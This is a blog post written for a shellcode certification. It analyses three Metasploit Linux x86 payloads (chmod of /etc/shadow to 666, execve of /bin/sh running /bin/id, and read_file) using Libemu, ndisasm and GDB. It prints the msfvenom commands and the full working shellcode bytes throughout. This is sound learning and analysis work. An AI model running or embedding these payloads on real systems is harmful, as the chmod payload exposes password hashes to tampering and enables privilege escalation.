---
title: Analyzing Metasploit Shellcode 
author: fwinsnes
date: 2021-01-18 13:44:00 +0800
categories: [SLAE]
tags: [assembly, shellcoding]
---

#### Introduction

These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. 

The fifth assignment from the seven requires analyzing three [shellcodes](https://es.wikipedia.org/wiki/Shellcode) generated by Metasploit through GDB/Ndisasm/Libemu. 
Furthermore, it is required to report the findings during the analysis.

#### Chmod Shellcode (Shellcode #1)

The first shellcode to be analyzed will be one that supposedly chmods a file, however, it isn't really known which one or the type of privileges that are granted. Let's find 
out!

Generating the shellcode with msfvenom:

```term
root@whitecr0wz:~# msfvenom -p linux/x86/chmod -f c 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes
Final size of c file: 177 bytes
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
root@whitecr0wz:~#
```

##### Libemu

Analyzing the shellcode with Libemu:

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ echo -ne 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | 
../../../libemu/tools/sctest/sctest -vvv -Ss 10000 
verbose = 3
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417000
[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x1a155f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417000
[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x1a155f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 99                              cwd 
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417001
[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x1a155f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 6A0F                            push byte 0xf
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417003
[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 58                              pop eax
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417004
[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x1a155f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 52                              push edx
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417005
[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] E8                              call 0x1
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417016
[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x1a155f0 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 5B                              pop ebx
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417017
[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x0041700a
[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 68B6010000                      push dword 0x1b6
[emu 0x0x1a155f0 debug ] cpu state    eip=0x0041701c
[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x0041700a
[emu 0x0x1a155f0 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 59                              pop ecx
[emu 0x0x1a155f0 debug ] cpu state    eip=0x0041701d
[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] CD80                            int 0x80
sys_chmod(2)
[emu 0x0x1a155f0 debug ] cpu state    eip=0x0041701f
[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 6A01                            push byte 0x1
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417021
[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x1a155f0 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 58                              pop eax
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417022
[emu 0x0x1a155f0 debug ] eax=0x00000001  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] CD80                            int 0x80
sys_exit(2)
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417024
[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
[emu 0x0x1a155f0 debug ] 0000                            add [eax],al
cpu error error accessing 0x00000004 not mapped

stepcount 12
[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417026
[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x1a155f0 debug ] Flags: 
ERROR  chmod (
) =  -1;
ERROR  exit (
     int status = 4288522;
```

##### Ndisasm

As seen on the shown text, Libemu reports that the chmod syscall is being initialized! Let's take a closer look to the code with ndisasm.

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ echo -ne 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u - 
00000000  99                cdq
00000001  6A0F              push byte +0xf
00000003  58                pop eax
00000004  52                push edx
00000005  E80C000000        call 0x16
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popa
00000012  646F              fs outsd
00000014  7700              ja 0x16
00000016  5B                pop ebx
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$
```

Really interesting, according to the man page of chmod, ECX should hold the privileges for the file that will be chmodded. As seen, dword "0x1b6" is being pushed into ECX, which 
in octal means 666! Even more so, we can see EAX performing the syscall in hex, as 0xf in decimal is actually 15, value for the chmod syscall.
Regarding the file itself, let's have a closer look with GDB.

##### GDB

We can easily see the value of the file being altered when the execution is parsed into EAX.

Let's save this into a C file and compile it:

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ gcc dissect_1.c -o dissect_1 -fno-stack-protector -z execstack -w 
whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ gdb -q ./dissect_1
```

```term
(gdb) break main
Breakpoint 1 at 0x11b8
(gdb) run
Starting program: /home/whitecr0wz/assembly/assignments/Assignment_5/dissect1/dissect_1 

Breakpoint 1, 0x004011b8 in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x004011a9 <+0>:     lea    ecx,[esp+0x4]
   0x004011ad <+4>:     and    esp,0xfffffff0
   0x004011b0 <+7>:     push   DWORD PTR [ecx-0x4]
   0x004011b3 <+10>:    push   ebp
   0x004011b4 <+11>:    mov    ebp,esp
   0x004011b6 <+13>:    push   ebx
   0x004011b7 <+14>:    push   ecx
=> 0x004011b8 <+15>:    sub    esp,0x10
   0x004011bb <+18>:    call   0x4010b0 <__x86.get_pc_thunk.bx>
   0x004011c0 <+23>:    add    ebx,0x2e40
   0x004011c6 <+29>:    sub    esp,0xc
   0x004011c9 <+32>:    lea    eax,[ebx+0x40]
   0x004011cf <+38>:    push   eax
   0x004011d0 <+39>:    call   0x401040 <strlen@plt>
   0x004011d5 <+44>:    add    esp,0x10
   0x004011d8 <+47>:    sub    esp,0x8
   0x004011db <+50>:    push   eax
   0x004011dc <+51>:    lea    eax,[ebx-0x1ff8]
   0x004011e2 <+57>:    push   eax
   0x004011e3 <+58>:    call   0x401030 <printf@plt>
   0x004011e8 <+63>:    add    esp,0x10
   0x004011eb <+66>:    lea    eax,[ebx+0x40]
   0x004011f1 <+72>:    mov    DWORD PTR [ebp-0xc],eax
   0x004011f4 <+75>:    mov    eax,DWORD PTR [ebp-0xc]
   0x004011f7 <+78>:    call   eax
   0x004011f9 <+80>:    mov    eax,0x0
   0x004011fe <+85>:    lea    esp,[ebp-0x8]
   0x00401201 <+88>:    pop    ecx
   0x00401202 <+89>:    pop    ebx
   0x00401203 <+90>:    pop    ebp
   0x00401204 <+91>:    lea    esp,[ecx-0x4]
   0x00401207 <+94>:    ret    
End of assembler dump.
(gdb) 
```

Let's put a breakpoint in 0x004011f7, place where the shellcode will finally be executed, loading the values that require the operation in EAX.

```term
(gdb) break *0x004011f7
Breakpoint 2 at 0x4011f7
(gdb) c
Continuing.
Shellcode Length:  7

Breakpoint 2, 0x004011f7 in main ()
(gdb)
```

If we read EAX we see something really interesting:

```term
(gdb) x/4s $eax 
0x404040 <code>:        "\231j\017XR\350\f"
0x404048 <code+8>:      ""
0x404049 <code+9>:      ""
0x40404a <code+10>:     "/etc/shadow"
(gdb)
```

#### Conclusion (Shellcode #1)

As expected from the start, this shellcode will chmod a certain file. Nonethelss, when not specifing any sort of flag, the file chosen will always be /etc/shadow with the 
privileges in octal 666. 


#### Exec Shellcode (Shellcode #2)

The second shellcode to be analyzed will be one that executes a command, in this case being "/bin/id" 

Generating the shellcode with msfvenom:

```term
root@whitecr0wz:~# msfvenom -p linux/x86/exec CMD=/bin/id -f c 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 43 bytes
Final size of c file: 205 bytes
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
"\x62\x69\x6e\x2f\x69\x64\x00\x57\x53\x89\xe1\xcd\x80";
root@whitecr0wz:~# 
```

##### Libemu

Let's analyze this shellcode with Libemu:

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect2$ echo -ne 
"\x6A\x0B\x58\x99\x52\x66\x68\x2D\x63\x89\xE7\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\x52\xE8\x08\x00\x00\x00\x2F\x62\x69\x6E\x2F\x69\x64\x00\x57\x53\x89\xE1\xCD\x80" | 
../../../libemu/tools/sctest/sctest -vv -Ss 10000 
verbose = 2
[emu 0x0x8205f0 debug ] cpu state    eip=0x00417000
[emu 0x0x8205f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
[emu 0x0x8205f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
[emu 0x0x8205f0 debug ] Flags: 
[emu 0x0x8205f0 debug ] 6A0B                            push byte 0xb
[emu 0x0x8205f0 debug ] 58                              pop eax
[emu 0x0x8205f0 debug ] 99                              cwd 
[emu 0x0x8205f0 debug ] 52                              push edx
[emu 0x0x8205f0 debug ] 66682D63                        push word 0x632d
[emu 0x0x8205f0 debug ] 89E7                            mov edi,esp
[emu 0x0x8205f0 debug ] 682F736800                      push dword 0x68732f
[emu 0x0x8205f0 debug ] 682F62696E                      push dword 0x6e69622f
[emu 0x0x8205f0 debug ] 89E3                            mov ebx,esp
[emu 0x0x8205f0 debug ] 52                              push edx
[emu 0x0x8205f0 debug ] E8                              call 0x1
[emu 0x0x8205f0 debug ] 57                              push edi
[emu 0x0x8205f0 debug ] 53                              push ebx
[emu 0x0x8205f0 debug ] 89E1                            mov ecx,esp
[emu 0x0x8205f0 debug ] CD80                            int 0x80
execve
int execve (const char *dateiname=00416fc0={/bin/sh}, const char * argv[], const char *envp[]);
[emu 0x0x8205f0 debug ] 0000                            add [eax],al
cpu error error accessing 0x00000004 not mapped

stepcount 15
[emu 0x0x8205f0 debug ] cpu state    eip=0x0041702d
[emu 0x0x8205f0 debug ] eax=0x0000000b  ecx=0x00416fb0  edx=0x00000000  ebx=0x00416fc0
[emu 0x0x8205f0 debug ] esp=0x00416fb0  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
[emu 0x0x8205f0 debug ] Flags: 
int execve (
     const char * dateiname = 0x00416fc0 => 
           = "/bin/sh";
     const char * argv[] = [
           = 0x00416fb0 => 
               = 0x00416fc0 => 
                   = "/bin/sh";
           = 0x00416fb4 => 
               = 0x00416fc8 => 
                   = "-c";
           = 0x00416fb8 => 
               = 0x0041701d => 
                   = "/bin/id";
           = 0x00000000 => 
             none;
     ];
     const char * envp[] = 0x00000000 => 
         none;
) =  0;
whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect2$
```

#### Conclusion (Shellcode #2)

Interesting, execve is being executed. In addition with this, EBX is being given the value of /bin/sh through the ```PUSH DWORD``` instructions, whereas EDI is receiving the 
value of ```-c```. Even more so, we can comprehend from this output that the following argument ```/bin/id``` is being called from a variable through the instruction ```call 
0x1```, finally pushing the order in reverse and saving the address in ECX. This just shows the real power of Libemu, capable of dissecting a complete shellcode with no issues
within a simple output and even filtering those bytes which would mangle the output.

#### read_file Shellcode (Shellcode #3)

The second shellcode to be analyzed will be one that opens a file and reads it, in this case the one chosen being "./file". 

Generating the shellcode with msfvenom:

```term
root@whitecr0wz:~# msfvenom -p linux/x86/read_file PATH=./file -f c 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
"\xff\x2e\x2f\x66\x69\x6c\x65\x00";
root@whitecr0wz:~#
```

#### Ndisasm

Let's analyze this with Ndisasm:

```term
whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect3$ echo -ne 
"\xEB\x36\xB8\x05\x00\x00\x00\x5B\x31\xC9\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE7\x89\xF9\xBA\x00\x10\x00\x00\xCD\x80\x89\xC2\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xCD\x80
\xB8\x01\x00\x00\x00\xBB\x00\x00\x00\x00\xCD\x80\xE8\xC5\xFF\xFF\xFF\x2E\x2F\x66\x69\x6C\x65" | ndisasm -u - 
00000000  EB36              jmp short 0x38
00000002  B805000000        mov eax,0x5
00000007  5B                pop ebx
00000008  31C9              xor ecx,ecx
0000000A  CD80              int 0x80
0000000C  89C3              mov ebx,eax
0000000E  B803000000        mov eax,0x3
00000013  89E7              mov edi,esp
00000015  89F9              mov ecx,edi
00000017  BA00100000        mov edx,0x1000
0000001C  CD80              int 0x80
0000001E  89C2              mov edx,eax
00000020  B804000000        mov eax,0x4
00000025  BB01000000        mov ebx,0x1
0000002A  CD80              int 0x80
0000002C  B801000000        mov eax,0x1
00000031  BB00000000        mov ebx,0x0
00000036  CD80              int 0x80
00000038  E8C5FFFFFF        call 0x2
0000003D  2E2F              cs das
0000003F  66                o16
00000040  69                db 0x69
00000041  6C                insb
00000042  65                gs
whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect3$
```

Let's go section-by-section what is going on:

##### Syscall Open

```term
jmp short 0x38
mov eax,0x5
pop ebx
xor ecx,ecx
int 0x80
```

Arguments required for open:```int open(const char *pathname, int flags);```

It seems that we have come accross a JMP-CALL-POP technique! The jump will have most likely ended in a section with the file ```./file``` specified. Moreover, EAX was set to 
0x5, which is the syscall for open. Furthermore, the value of ```./file```  has been popped into EBX, as it is required to satisfy the argument ```pathname```. Lastly, ECX was 
set to zero, as the flags aren't relevant. 

##### Syscall Read

```term
mov ebx,eax
mov eax,0x3
mov edi,esp
mov ecx,edi
mov edx,0x1000
int 0x80
```

Arguments required for read: ```ssize_t read(int fd, void *buf, size_t count);```

+ The value of EAX has been saved into EBX for further referrals to the file descriptor.
+ EAX is given the value of 3, syscall of read.
+ The address of ESP is copied into EDI and from EDI to ECX, satisfying the argument *buf*, buffer where to read the file.
+ EDX is set 1000 in order to satisfy the ```count``` argument.

##### Syscall Write

```term
mov edx,eax
mov eax,0x4
mov ebx,0x1
int 0x80
```

Arguments required for write:```ssize_t write(int fd, const void *buf, size_t count);```

+ EDX is given the bytes returned from the Read Syscall from through EAX.
+ EAX is given the value of 4, syscall for write.
+ EBX is given value 1, in order to write to the screen through STDOUT.
+ ECX keeps pointing to the buffer where to write bytes from.

This will finally write to the screen what has been opened and read.

The following syscalls beyond the already shown are exit syscalls in order to exit the program gracefully. Furthermore, the resting bytes should be the variables.

#### Conclusion (Shellcode #3)

This last shellcode will, open, read, write to the screen what was read and finally exit gracefully the program. 

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE-27812/PA-27812

You can find all of the used resources [here](https://github.com/whitecr0wz/SLAE/).
